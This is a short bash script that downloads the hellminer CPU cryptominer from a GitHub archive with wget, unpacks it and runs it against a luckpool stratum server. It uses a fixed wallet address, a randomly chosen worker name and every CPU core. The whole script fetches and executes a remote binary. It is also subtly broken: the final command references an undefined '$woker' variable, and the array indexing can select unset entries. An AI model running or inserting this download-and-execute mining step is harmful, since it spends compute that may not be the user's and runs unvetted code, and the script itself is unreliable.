#erl_andi
array[2]="3"
array[3]="4"
array[4]="5"
array[5]="6"
array[6]="7"
array[7]="8"
array[8]="9"
array[9]="10"
array[10]="11"
array[11]="12"
array[12]="13"
array[13]="14"
array[14]="15"
array[15]="16"
array[16]="17"
array[17]="18"
array[18]="19"
array[19]="20"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
tar xf hellminer_cpu_linux.tar.gz 
chmod +x hellminer 
./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.hyoka-$woker -p x --cpu $(nproc)
